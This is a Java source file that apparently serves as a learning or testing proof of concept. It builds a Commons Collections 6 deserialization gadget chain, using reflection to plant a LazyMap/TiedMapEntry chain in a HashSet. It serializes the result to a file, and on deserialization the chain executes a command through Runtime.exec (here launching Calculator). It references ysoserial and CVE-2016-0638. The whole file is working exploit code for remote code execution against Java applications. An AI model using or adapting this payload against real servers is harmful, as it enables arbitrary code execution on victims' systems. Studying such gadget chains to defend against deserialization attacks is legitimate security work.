package t3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;


public class hashset {

    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
        String path = "/Users/apple-qkl/Desktop/ysoserial.jar";
        String gadget = "CommonsCollections6";
        String command = "touch /tmp/CVE_2016_0638";
        payload(path,gadget,command);
    }

    public static byte[] payload(String path,String gadget, String command) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {

        Object payload = getObject();


        HashSet set = new HashSet(1);
        set.add("foo");
        Field f =null;
        try{
            f = HashSet.class.getDeclaredField("map");
        }catch(NoSuchFieldException e){
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap map = (HashMap)f.get(set);


        Field f2 = null;
        try{
            f2 = HashMap.class.getDeclaredField("table");
        }catch (NoSuchFieldException e){
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node,payload);



       byte[] payload2 = Ysoserial.serial(set);



        File file = new File("/tmp/hashser.ser");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
        oos.writeObject(set);
        //return bos.toByteArray();


        /*
        ByteArrayInputStream bais = new ByteArrayInputStream(payload2);
        ObjectInputStream in = new ObjectInputStream(bais);
        //in.readObject();

         */

        return payload2;

    }

    public static Object getObject() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map beforemap = new HashMap();
        Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1);


        HashSet map = new HashSet(1);
        map.add("foo");

        Field f = null;
        try{
            f = HashSet.class.getDeclaredField("map");
        }catch(NoSuchFieldException e){
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        //返回map对象上此Field表示的字段的值
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try{
            f2 = HashMap.class.getDeclaredField("table");
        }catch (NoSuchFieldException e){
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node,tiedMapEntry);

        return map;
    }
}
